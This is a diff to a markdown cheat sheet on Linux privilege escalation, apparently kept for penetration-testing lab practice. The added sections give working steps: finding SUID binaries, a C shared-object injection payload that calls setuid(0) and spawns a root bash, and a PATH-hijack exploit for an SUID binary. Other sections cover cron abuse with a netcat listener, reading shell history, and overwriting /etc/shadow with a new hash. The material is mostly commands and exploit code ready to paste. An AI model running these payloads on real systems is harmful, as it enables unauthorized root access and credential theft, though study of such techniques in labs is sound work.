@@ -194,19 +194,93 @@ find / -name "local.txt" 2>/dev/null
 find / -name "proof.txt" 2>/dev/null
 ```
 
+###### SUDO exploitation : 
 programs "user" allowed to run via sudo
 ```
 sudo -l 
 ```
+go to gtfo bins
+and use sudo before command as `sudo <command>`
 
-SUID : 
-command : 
+
+##### SUID Executables : 
+###### Known exploits : 
+Find all the SUID/SGID executables on the Debian VM
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
 ```
 find / -user root -perm /4000 2>/dev/null
 ```
+Find known exploit for `versions` found of executables on searchsploit , Google, and GitHub
+or go to gtfo bins 
+###### SUID shared object (.so) injection : 
+find a `-so` executables
+then run this to check the files its asking for but not available 
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+# replace the file name with the shared file name/location
+```
+ex we get its asking for another shared object : `/home/user/.config/libcalc.so`
+create that directory by `mkdir /home/user/.config`
+go inside that directory and create a exploit : 
+```
+nano exploit.c
+```
+and paste this code 
+```
+#include <stdio.h>
+#include <stdlib.h>
 
-Cron tabs 
-Weak File Permissions : 
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+give permission `chmod +x exploit.c`
+compile the code to that location it asks for 
+```
+gcc -shared -fPIC -o /home/user/.config/libcalc.so exploit.c
+```
+now again run the initial executable
+```
+/usr/local/bin/suid-so
+# run directly , you will get a root shell now
+```
+###### Environment Variables (without absolute service path) : 
+find if you have any env files : `/usr/local/bin/suid-env`
+Find what it executes : `strings /usr/local/bin/suid-env`
+see if it starts any service without proving the full path
+if no , create an exploit : 
+```
+nano service.c
+```
+and paste the code :
+```
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+Compile it:
+```
+gcc -o service service.c
+```
+Put your directory first in PATH
+```
+PATH=.:$PATH
+# "." means: the current directory
+```
+now just run the executable again : 
+```
+/usr/local/bin/suid-env
+```
+
+##### Cron tabs :
+###### Weak File Permissions : 
 minute ; hour ; day of month ; month ; day of week
 ```
 1. View System-wide crontab: cat /etc/crontab
@@ -224,7 +298,7 @@ and start listener on kali
 nc -nvlp 4444
 ```
 
-PATH Manipulation : 
+###### PATH Manipulation : 
 View the contents of the system-wide crontab:  
 ```
 cat /etc/crontab
@@ -252,7 +326,7 @@ export PATH=/tmp:$PATH
 # echo $PATH
 ```
 
-Wild Cards :
+###### Wild Cards :
 cat the cron job file 
 if it has `tar czf /tmp/backup.tar.gz *`
 check gtfo bin if it has `-- option name` available or not
@@ -287,7 +361,7 @@ Then:
 /tmp/rootbash -p
 ```
 
-
+##### Others : 
 read bash (commands and password entered) history : 
 ```
 cat ~/.*history
@@ -309,11 +383,11 @@ password files readable/writeable :
 ls -la /etc/passwd
 ls -la /etc/shadow
 
+# create a new passowrd hash and paste it there : 
 openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
 ```
 
 # <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>
-
 
 like `tmp` folder in linux , windows has `tasks` folder , which is world writeable
 ```
